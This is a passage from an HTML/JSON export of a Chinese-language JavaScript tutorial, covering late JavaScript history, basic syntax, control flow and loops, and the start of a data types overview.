项目、以及该项目进展缓慢的不满，一部分核心开发者离开了 Node.js，创造了 io.js 项目，这是一个更开放、更新更频繁的 Node.js 版本，很短时间内就发布到了2.0版。三个月后，Joyent 公司宣布放弃对 Node 项目的控制，将其转交给新成立的开放性质的 Node 基金会。随后，io.js 项目宣布回归 Node，两个版本将合并。</p>\n<p>2015年3月，Facebook 公司发布了 React Native 项目，将 React 框架移植到了手机端，可以用来开发手机 App。它会将 JavaScript 代码转为 iOS 平台的 Objective-C 代码，或者 Android 平台的 Java 代码，从而为 JavaScript 语言开发高性能的原生 App 打开了一条道路。</p>\n<p>2015年4月，Angular 框架宣布，2.0 版将基于微软公司的TypeScript语言开发，这等于为 JavaScript 语言引入了强类型。</p>\n<p>2015年5月，Node 模块管理器 NPM 超越 CPAN，标志着 JavaScript 成为世界上软件模块最多的语言。</p>\n<p>2015年5月，Google 公司的 Polymer 框架发布1.0版。该项目的目标是生产环境可以使用 WebComponent 组件，如果能够达到目标，Web 开发将进入一个全新的以组件为开发基础的阶段。</p>\n<p>2015年6月，ECMA 标准化组织正式批准了 ECMAScript 6 语言标准，定名为《ECMAScript 2015 标准》。JavaScript语言正式进入了下一个阶段，成为一种企业级的、开发大规模应用的语言。这个标准从提出到批准，历时10年，而 JavaScript 语言从诞生至今也已经20年了。</p>\n<p>2015年6月，Mozilla 在 asm.js 的基础上发布 WebAssembly 项目。这是一种 JavaScript 引擎的中间码格式，全部都是二进制，类似于 Java 的字节码，有利于移动设备加载 JavaScript 脚本，执行速度提高了 20+ 倍。这意味着将来的软件，会发布 JavaScript 二进制包。</p>\n<p>2016年6月，《ECMAScript 2016 标准》发布。与前一年发布的版本相比，它只增加了两个较小的特性。</p>\n<p>2017年6月，《ECMAScript 2017 标准》发布，正式引入了 async 函数，使得异步操作的写法出现了根本的变化。</p>\n<p>2017年11月，所有主流浏览器全部支持 WebAssembly，这意味着任何语言都可以编译成 JavaScript，在浏览器运行。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://oreilly.com/javascript/radarreports/past-present-future-javascript.csp\">The Past, Present, and Future of JavaScript</a></li>\n<li>John Dalziel, <a href=\"http://creativejs.com/2013/06/the-race-for-speed-part-4-the-future-for-javascript/\">The race for speed part 4: The future for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>resin.io, <a href=\"http://resin.io/happy-18th-birthday-javascript/\">Happy 18th Birthday JavaScript! A look at an unlikely past and bright future</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"基本语法","link":"/basic/grammar.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-的基本语法' class='header-anchor'>#</a>\n            <span>JavaScript 的基本语法</span>\n        </h1>\n    \n        <h2>\n            <a href='#语句' class='header-anchor'>#</a>\n            <span>语句</span>\n        </h2>\n    <p>JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。</p>\n<p>语句（statement）是为了完成某种任务而进行的操作，比如下面就是一行赋值语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3;</code></pre><p>这条语句先用<code>var</code>命令，声明了变量<code>a</code>，然后将<code>1 + 3</code>的运算结果赋值给变量<code>a</code>。</p>\n<p><code>1 + 3</code>叫做表达式（expression），指一个为了得到返回值的计算式。语句和表达式的区别在于，前者主要为了进行某种操作，一般情况下不需要返回值；后者则是为了得到返回值，一定会返回一个值。凡是 JavaScript 语言中预期为值的地方，都可以使用表达式。比如，赋值语句的等号右边，预期是一个值，因此可以放置各种表达式。</p>\n<p>语句以分号结尾，一个分号就表示一个语句结束。多个语句可以写在一行内。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3 ; var b = &#039;abc&#039;;</code></pre><p>分号前面可以没有任何内容，JavaScript引擎将其视为空语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>;;;</code></pre><p>上面的代码就表示3个空语句。</p>\n<p>表达式不需要分号结尾。一旦在表达式后面添加分号，则 JavaScript 引擎就将表达式视为语句，这样会产生一些没有任何意义的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 3;\n&#039;abc&#039;;</code></pre><p>上面两行语句只是单纯地产生一个值，并没有任何实际的意义。</p>\n\n        <h2>\n            <a href='#变量' class='header-anchor'>#</a>\n            <span>变量</span>\n        </h2>\n    \n        <h3>\n            <a href='#概念' class='header-anchor'>#</a>\n            <span>概念</span>\n        </h3>\n    <p>变量是对“值”的具名引用。变量就是为“值”起名，然后引用这个名字，就等同于引用这个值。变量的名字就是变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;</code></pre><p>上面的代码先声明变量<code>a</code>，然后在变量<code>a</code>与数值1之间建立引用关系，称为将数值1“赋值”给变量<code>a</code>。以后，引用变量名<code>a</code>就会得到数值1。最前面的<code>var</code>，是变量声明命令。它表示通知解释引擎，要创建一个变量<code>a</code>。</p>\n<p>注意，JavaScript 的变量名区分大小写，<code>A</code>和<code>a</code>是两个不同的变量。</p>\n<p>变量的声明和赋值，是分开的两个步骤，上面的代码将它们合在了一起，实际的步骤是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na = 1;</code></pre><p>如果只是声明变量而没有赋值，则该变量的值是<code>undefined</code>。<code>undefined</code>是一个 JavaScript 关键字，表示“无定义”。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na // undefined</code></pre><p>如果变量赋值的时候，忘了写<code>var</code>命令，这条语句也是有效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n// 基本等同\na = 1;</code></pre><p>但是，不写<code>var</code>的做法，不利于表达意图，而且容易不知不觉地创建全局变量，所以建议总是使用<code>var</code>命令声明变量。</p>\n<p>如果一个变量没有声明就直接使用，JavaScript 会报错，告诉你变量未定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>x\n// ReferenceError: x is not defined</code></pre><p>上面代码直接使用变量<code>x</code>，系统就报错，告诉你变量<code>x</code>没有声明。</p>\n<p>可以在同一条<code>var</code>命令中声明多个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a, b;</code></pre><p>JavaScript 是一种动态类型语言，也就是说，变量的类型没有限制，变量可以随时更改类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\na = &#039;hello&#039;;</code></pre><p>上面代码中，变量<code>a</code>起先被赋值为一个数值，后来又被重新赋值为一个字符串。第二次赋值的时候，因为变量<code>a</code>已经存在，所以不需要使用<code>var</code>命令。</p>\n<p>如果使用<code>var</code>重新声明一个已经存在的变量，是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x;\nx // 1</code></pre><p>上面代码中，变量<code>x</code>声明了两次，第二次声明是无效的。</p>\n<p>但是，如果第二次声明的时候还进行了赋值，则会覆盖掉前面的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x = 2;\n\n// 等同于\n\nvar x = 1;\nvar x;\nx = 2;</code></pre>\n        <h3>\n            <a href='#变量提升' class='header-anchor'>#</a>\n            <span>变量提升</span>\n        </h3>\n    <p>JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(a);\nvar a = 1;</code></pre><p>上面代码首先使用<code>console.log</code>方法，在控制台（console）显示变量<code>a</code>的值。这时变量<code>a</code>还没有声明和赋值，所以这是一种错误的做法，但是实际上不会报错。因为存在变量提升，真正运行的是下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\nconsole.log(a);\na = 1;</code></pre><p>最后的结果是显示<code>undefined</code>，表示变量<code>a</code>已声明，但还未赋值。</p>\n\n        <h2>\n            <a href='#标识符' class='header-anchor'>#</a>\n            <span>标识符</span>\n        </h2>\n    <p>标识符（identifier）指的是用来识别各种值的合法名称。最常见的标识符就是变量名，以及后面要提到的函数名。JavaScript 语言的标识符对大小写敏感，所以<code>a</code>和<code>A</code>是两个不同的标识符。</p>\n<p>标识符有一套命名规则，不符合规则的就是非法标识符。JavaScript 引擎遇到非法标识符，就会报错。</p>\n<p>简单说，标识符命名规则如下。</p>\n<ul>\n<li>第一个字符，可以是任意 Unicode 字母（包括英文字母和其他语言的字母），以及美元符号（<code>$</code>）和下划线（<code>_</code>）。</li>\n<li>第二个字符及后面的字符，除了 Unicode 字母、美元符号和下划线，还可以用数字<code>0-9</code>。</li>\n</ul>\n<p>下面这些都是合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>arg0\n_tmp\n$elem\nπ</code></pre><p>下面这些则是不合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>1a  // 第一个字符不能是数字\n23  // 同上\n***  // 标识符不能包含星号\na+b  // 标识符不能包含加号\n-d  // 标识符不能包含减号或连词线</code></pre><p>中文是合法的标识符，可以用作变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var 临时变量 = 1;</code></pre><blockquote>\n<p>JavaScript有一些保留字，不能用作标识符：arguments、break、case、catch、class、const、continue、debugger、default、delete、do、else、enum、eval、export、extends、false、finally、for、function、if、implements、import、in、instanceof、interface、let、new、null、package、private、protected、public、return、static、super、switch、this、throw、true、try、typeof、var、void、while、with、yield。</p>\n</blockquote>\n\n        <h2>\n            <a href='#注释' class='header-anchor'>#</a>\n            <span>注释</span>\n        </h2>\n    <p>源码中被 JavaScript 引擎忽略的部分就叫做注释，它的作用是对代码进行解释。Javascript 提供两种注释的写法：一种是单行注释，用<code>//</code>起头；另一种是多行注释，放在<code>/*</code>和<code>*/</code>之间。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 这是单行注释\n\n/*\n 这是\n 多行\n 注释\n*/</code></pre><p>此外，由于历史上 JavaScript 可以兼容 HTML 代码的注释，所以<code>&lt;!--</code>和<code>--&gt;</code>也被视为合法的单行注释。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = 1; &lt;!-- x = 2;\n--&gt; x = 3;</code></pre><p>上面代码中，只有<code>x = 1</code>会执行，其他的部分都被注释掉了。</p>\n<p>需要注意的是，<code>--&gt;</code>只有在行首，才会被当成单行注释，否则会当作正常的运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>function countdown(n) {\n  while (n --&gt; 0) console.log(n);\n}\ncountdown(3)\n// 2\n// 1\n// 0</code></pre><p>上面代码中，<code>n --&gt; 0</code>实际上会当作<code>n-- &gt; 0</code>，因此输出2、1、0。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>JavaScript 使用大括号，将多个相关的语句组合在一起，称为“区块”（block）。</p>\n<p>对于<code>var</code>命令来说，JavaScript 的区块不构成单独的作用域（scope）。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  var a = 1;\n}\n\na // 1</code></pre><p>上面代码在区块内部，使用<code>var</code>命令声明并赋值了变量<code>a</code>，然后在区块外部，变量<code>a</code>依然有效，区块对于<code>var</code>命令不构成单独的作用域，与不使用区块的情况没有任何区别。在 JavaScript 语言中，单独使用区块并不常见，区块往往用来构成其他更复杂的语法结构，比如<code>for</code>、<code>if</code>、<code>while</code>、<code>function</code>等。</p>\n\n        <h2>\n            <a href='#条件语句' class='header-anchor'>#</a>\n            <span>条件语句</span>\n        </h2>\n    <p>JavaScript 提供<code>if</code>结构和<code>switch</code>结构，完成条件判断，即只有满足预设的条件，才会执行相应的语句。</p>\n\n        <h3>\n            <a href='#if-结构' class='header-anchor'>#</a>\n            <span>if 结构</span>\n        </h3>\n    <p><code>if</code>结构先判断一个表达式的布尔值，然后根据布尔值的真伪，执行不同的语句。所谓布尔值，指的是 JavaScript 的两个特殊值，<code>true</code>表示真，<code>false</code>表示<code>伪</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (布尔值)\n  语句;\n\n// 或者\nif (布尔值) 语句;</code></pre><p>上面是<code>if</code>结构的基本形式。需要注意的是，“布尔值”往往由一个条件表达式产生的，必须放在圆括号中，表示对表达式求值。如果表达式的求值结果为<code>true</code>，就执行紧跟在后面的语句；如果结果为<code>false</code>，则跳过紧跟在后面的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3)\n  m = m + 1;</code></pre><p>上面代码表示，只有在<code>m</code>等于3时，才会将其值加上1。</p>\n<p>这种写法要求条件表达式后面只能有一个语句。如果想执行多个语句，必须在<code>if</code>的条件判断之后，加上大括号，表示代码块（多个语句合并成一个语句）。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  m += 1;\n}</code></pre><p>建议总是在<code>if</code>语句中使用大括号，因为这样方便插入语句。</p>\n<p>注意，<code>if</code>后面的表达式之中，不要混淆赋值表达式（<code>=</code>）、严格相等运算符（<code>===</code>）和相等运算符（<code>==</code>）。尤其是赋值表达式不具有比较作用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 2;\nif (x = y) {\n  console.log(x);\n}\n// &quot;2&quot;</code></pre><p>上面代码的原意是，当<code>x</code>等于<code>y</code>的时候，才执行相关语句。但是，不小心将严格相等运算符写成赋值表达式，结果变成了将<code>y</code>赋值给变量<code>x</code>，再判断变量<code>x</code>的值（等于2）的布尔值（结果为<code>true</code>）。</p>\n<p>这种错误可以正常生成一个布尔值，因而不会报错。为了避免这种情况，有些开发者习惯将常量写在运算符的左边，这样的话，一旦不小心将相等运算符写成赋值运算符，就会报错，因为常量不能被赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x = 2) { // 不报错\nif (2 = x) { // 报错</code></pre><p>至于为什么优先采用“严格相等运算符”（<code>===</code>），而不是“相等运算符”（<code>==</code>），请参考《运算符》章节。</p>\n\n        <h3>\n            <a href='#if...else-结构' class='header-anchor'>#</a>\n            <span>if...else 结构</span>\n        </h3>\n    <p><code>if</code>代码块后面，还可以跟一个<code>else</code>代码块，表示不满足条件时，所要执行的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  // 满足条件时，执行的语句\n} else {\n  // 不满足条件时，执行的语句\n}</code></pre><p>上面代码判断变量<code>m</code>是否等于3，如果等于就执行<code>if</code>代码块，否则执行<code>else</code>代码块。</p>\n<p>对同一个变量进行多次判断时，多个<code>if...else</code>语句可以连写在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 0) {\n  // ...\n} else if (m === 1) {\n  // ...\n} else if (m === 2) {\n  // ...\n} else {\n  // ...\n}</code></pre><p><code>else</code>代码块总是与离自己最近的那个<code>if</code>语句配对。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = 1;\nvar n = 2;\n\nif (m !== 1)\nif (n === 2) console.log(&#039;hello&#039;);\nelse console.log(&#039;world&#039;);</code></pre><p>上面代码不会有任何输出，<code>else</code>代码块不会得到执行，因为它跟着的是最近的那个<code>if</code>语句，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  } else {\n    console.log(&#039;world&#039;);\n  }\n}</code></pre><p>如果想让<code>else</code>代码块跟随最上面的那个<code>if</code>语句，就要改变大括号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  }\n} else {\n  console.log(&#039;world&#039;);\n}\n// world</code></pre>\n        <h3>\n            <a href='#switch-结构' class='header-anchor'>#</a>\n            <span>switch 结构</span>\n        </h3>\n    <p>多个<code>if...else</code>连在一起使用的时候，可以转为使用更方便的<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (fruit) {\n  case &quot;banana&quot;:\n    // ...\n    break;\n  case &quot;apple&quot;:\n    // ...\n    break;\n  default:\n    // ...\n}</code></pre><p>上面代码根据变量<code>fruit</code>的值，选择执行相应的<code>case</code>。如果所有<code>case</code>都不符合，则执行最后的<code>default</code>部分。需要注意的是，每个<code>case</code>代码块内部的<code>break</code>语句不能少，否则会接下去执行下一个<code>case</code>代码块，而不是跳出<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}\n// x等于1\n// x等于2\n// x等于其他值</code></pre><p>上面代码中，<code>case</code>代码块之中没有<code>break</code>语句，导致不会跳出<code>switch</code>结构，而会一直执行下去。正确的写法是像下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n    break;\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n    break;\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}</code></pre><p><code>switch</code>语句部分和<code>case</code>语句部分，都可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (1 + 3) {\n  case 2 + 2:\n    f();\n    break;\n  default:\n    neverHappens();\n}</code></pre><p>上面代码的<code>default</code>部分，是永远不会执行到的。</p>\n<p>需要注意的是，<code>switch</code>语句后面的表达式，与<code>case</code>语句后面的表示式比较运行结果时，采用的是严格相等运算符（<code>===</code>），而不是相等运算符（<code>==</code>），这意味着比较时不会发生类型转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case true:\n    console.log(&#039;x 发生类型转换&#039;);\n  default:\n    console.log(&#039;x 没有发生类型转换&#039;);\n}\n// x 没有发生类型转换</code></pre><p>上面代码中，由于变量<code>x</code>没有发生类型转换，所以不会执行<code>case true</code>的情况。这表明，<code>switch</code>语句内部采用的是“严格相等运算符”，详细解释请参考《运算符》一节。</p>\n\n        <h3>\n            <a href='#三元运算符-?:' class='header-anchor'>#</a>\n            <span>三元运算符 ?:</span>\n        </h3>\n    <p>JavaScript还有一个三元运算符（即该运算符需要三个运算子）<code>?:</code>，也可以用于逻辑判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>(条件) ? 表达式1 : 表达式2</code></pre><p>上面代码中，如果“条件”为<code>true</code>，则返回“表达式1”的值，否则返回“表达式2”的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even = (n % 2 === 0) ? true : false;</code></pre><p>上面代码中，如果<code>n</code>可以被2整除，则<code>even</code>等于<code>true</code>，否则等于<code>false</code>。它等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even;\nif (n % 2 === 0) {\n  even = true;\n} else {\n  even = false;\n}</code></pre><p>这个三元运算符可以被视为<code>if...else...</code>的简写形式，因此可以用于多种场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myVar;\nconsole.log(\n  myVar ?\n  &#039;myVar has a value&#039; :\n  &#039;myVar does not have a value&#039;\n)\n// myVar does not have a value</code></pre><p>上面代码利用三元运算符，输出相应的提示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var msg = &#039;数字&#039; + n + &#039;是&#039; + (n % 2 === 0 ? &#039;偶数&#039; : &#039;奇数&#039;);</code></pre><p>上面代码利用三元运算符，在字符串之中插入不同的值。</p>\n\n        <h2>\n            <a href='#循环语句' class='header-anchor'>#</a>\n            <span>循环语句</span>\n        </h2>\n    <p>循环语句用于重复执行某个操作，它有多种形式。</p>\n\n        <h3>\n            <a href='#while-循环' class='header-anchor'>#</a>\n            <span>while 循环</span>\n        </h3>\n    <p><code>While</code>语句包括一个循环条件和一段代码块，只要条件为真，就不断循环执行代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件)\n  语句;\n\n// 或者\nwhile (条件) 语句;</code></pre><p><code>while</code>语句的循环条件是一个表达式，必须放在圆括号中。代码块部分，如果只有一条语句，可以省略大括号，否则就必须加上大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件) {\n  语句;\n}</code></pre><p>下面是<code>while</code>语句的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i = i + 1;\n}</code></pre><p>上面的代码将循环100次，直到<code>i</code>等于100为止。</p>\n<p>下面的例子是一个无限循环，因为循环条件总是为真。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (true) {\n  console.log(&#039;Hello, world&#039;);\n}</code></pre>\n        <h3>\n            <a href='#for-循环' class='header-anchor'>#</a>\n            <span>for 循环</span>\n        </h3>\n    <p><code>for</code>语句是循环命令的另一种形式，可以指定循环的起点、终点和终止条件。它的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (初始化表达式; 条件; 递增表达式)\n  语句\n\n// 或者\n\nfor (初始化表达式; 条件; 递增表达式) {\n  语句\n}</code></pre><p><code>for</code>语句后面的括号里面，有三个表达式。</p>\n<ul>\n<li>初始化表达式（initialize）：确定循环变量的初始值，只在循环开始时执行一次。</li>\n<li>条件表达式（test）：每轮循环开始时，都要执行这个条件表达式，只有值为真，才继续进行循环。</li>\n<li>递增表达式（increment）：每轮循环的最后一个操作，通常用来递增循环变量。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nfor (var i = 0; i &lt; x; i++) {\n  console.log(i);\n}\n// 0\n// 1\n// 2</code></pre><p>上面代码中，初始化表达式是<code>var i = 0</code>，即初始化一个变量<code>i</code>；测试表达式是<code>i &lt; x</code>，即只要<code>i</code>小于<code>x</code>，就会执行循环；递增表达式是<code>i++</code>，即每次循环结束后，<code>i</code>增大1。</p>\n<p>所有<code>for</code>循环，都可以改写成<code>while</code>循环。上面的例子改为<code>while</code>循环，代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\nwhile (i &lt; x) {\n  console.log(i);\n  i++;\n}</code></pre><p><code>for</code>语句的三个部分（initialize、test、increment），可以省略任何一个，也可以全部省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ){\n  console.log(&#039;Hello World&#039;);\n}</code></pre><p>上面代码省略了<code>for</code>语句表达式的三个部分，结果就导致了一个无限循环。</p>\n\n        <h3>\n            <a href='#do...while-循环' class='header-anchor'>#</a>\n            <span>do...while 循环</span>\n        </h3>\n    <p><code>do...while</code>循环与<code>while</code>循环类似，唯一的区别就是先运行一次循环体，然后判断循环条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>do\n  语句\nwhile (条件);\n\n// 或者\ndo {\n  语句\n} while (条件);</code></pre><p>不管条件是否为真，<code>do...while</code>循环至少运行一次，这是这种结构最大的特点。另外，<code>while</code>语句后面的分号注意不要省略。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\ndo {\n  console.log(i);\n  i++;\n} while(i &lt; x);</code></pre>\n        <h3>\n            <a href='#break-语句和-continue-语句' class='header-anchor'>#</a>\n            <span>break 语句和 continue 语句</span>\n        </h3>\n    <p><code>break</code>语句和<code>continue</code>语句都具有跳转作用，可以让代码不按既有的顺序执行。</p>\n<p><code>break</code>语句用于跳出代码块或循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile(i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i++;\n  if (i === 10) break;\n}</code></pre><p>上面代码只会执行10次循环，一旦<code>i</code>等于10，就会跳出循环。</p>\n<p><code>for</code>循环也可以使用<code>break</code>语句跳出循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 5; i++) {\n  console.log(i);\n  if (i === 3)\n    break;\n}\n// 0\n// 1\n// 2\n// 3</code></pre><p>上面代码执行到<code>i</code>等于3，就会跳出循环。</p>\n<p><code>continue</code>语句用于立即终止本轮循环，返回循环结构的头部，开始下一轮循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100){\n  i++;\n  if (i % 2 === 0) continue;\n  console.log(&#039;i 当前为：&#039; + i);\n}</code></pre><p>上面代码只有在<code>i</code>为奇数时，才会输出<code>i</code>的值。如果<code>i</code>为偶数，则直接进入下一轮循环。</p>\n<p>如果存在多重循环，不带参数的<code>break</code>语句和<code>continue</code>语句都只针对最内层循环。</p>\n\n        <h3>\n            <a href='#标签（label）' class='header-anchor'>#</a>\n            <span>标签（label）</span>\n        </h3>\n    <p>JavaScript 语言允许，语句的前面有标签（label），相当于定位符，用于跳转到程序的任意位置，标签的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>label:\n  语句</code></pre><p>标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。</p>\n<p>标签通常与<code>break</code>语句和<code>continue</code>语句配合使用，跳出特定的循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) break top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0</code></pre><p>上面代码为一个双重循环区块，<code>break</code>命令后面加上了<code>top</code>标签（注意，<code>top</code>不用加引号），满足条件时，直接跳出双层循环。如果<code>break</code>语句后面不使用标签，则只能跳出内层循环，进入下一次的外层循环。</p>\n<p>标签也可以用于跳出代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo: {\n  console.log(1);\n  break foo;\n  console.log(&#039;本行不会输出&#039;);\n}\nconsole.log(2);\n// 1\n// 2</code></pre><p>上面代码执行到<code>break foo</code>，就会跳出区块。</p>\n<p><code>continue</code>语句也可以与标签配合使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) continue top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0\n// i=2, j=0\n// i=2, j=1\n// i=2, j=2</code></pre><p>上面代码中，<code>continue</code>命令后面有一个标签名，满足条件时，会跳过当前循环，直接进入下一轮外层循环。如果<code>continue</code>语句后面不使用标签，则只能进入下一轮的内层循环。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/10/javascript-overview.html\">A quick overview of JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"概述","link":"/types/general.html"}],"content":"\n        <h1>\n            <a href='#数据类型概述' class='header-anchor'>#</a>\n            <span>数据类型概述</span>\n        </h1>\n    \n        <h2>\n            <a href='#简介' class='header-anchor'>#</a>\n            <span>简介</span>\n        </h2>\n    <p>JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 又新增了第七种 Symbol 类型的值，本教程不涉及。）</p>\n<ul>\n<li>数值（number）：整数和小数（比如<code>1</code>和<code>3.14</code>）</li>\n<li>字符串（string）：文本（比如<code>Hello World</code>）。</li>\n<li>布尔值（boolean）：表示真伪的两个特殊值，即<code>true</code>（真）和<code>false</code>（假）</li>\n<li><code>undefined</code>：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值</li>\n<li><code>null</code>：表示空值，即此处的值为空。</li>\n<li>对象（object）：各种值组成的集合。</li>\n</ul>\n<p>通常，数值、字符串、布尔值这三种类型，合称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。对象则称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于<code>undefined</code>和<code>null</code>，一般将它们看成两个特殊值。</p>\n<p>对象是最复杂的数据类型，又可以分成三个子类型。</p>\n<ul>\n<li>狭义的对象（object）</li>\n<li>数组（array）</li>\n<li>函数（function）</li>\n</ul>\n<p>狭义的对象和数组是两种不同的数据组合方式，除非特别声明，本教程的”对象“都特指狭义的对象。函数其实是处理数据的方法，JavaScript 把它当成一种数据类型，可以赋值给变量，这为编程带来了很大的灵活性，也为 JavaScript 的“函数式编程”奠定了基础。</p>\n\n        <h2>\n            <a href='#typeof-运算符' class='header-anchor'>#</a>\n            <span>typeof 运算符</span>\n        </h2>\n    <p>JavaScript 有三种方法，可以确定一个值到底是什么类型。</p>\n<ul>\n<li><code>typeof</code>运算符</li>\n<li><code>instanceof</code>运算符</li>\n<li><code>Object.prototype.toString</code>方法</li>\n</ul>\n<p><code>instanceof</code>运算符和<code>Object.prototype.toString</code>方法，将在后文介绍。这里介绍<code>typeof</code>运算符。</p>\n<p><code>typeof</code>运算符可以返回一个值的数据类型。</p>\n<p>数值、字符串、布尔值分别返回<code>number</code>、<code>string</code>、<code>boolean</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof 123 // &quot;number&quot;\ntypeof &#039;123&#039; // &quot;string&quot;\ntypeof false // &quot;boolean&quot;</code></pre><p>函数返回<code>function</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {}\ntypeof f\n// &quot;function&quot;</code></pre><p><code>undefined</code>返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof undefined\n// &quot;undefined&quot;</code></pre><p>利用这一点，<code>typeof</code>可以用来检查一个没有声明的变量，而不报错。</p>\n<pre 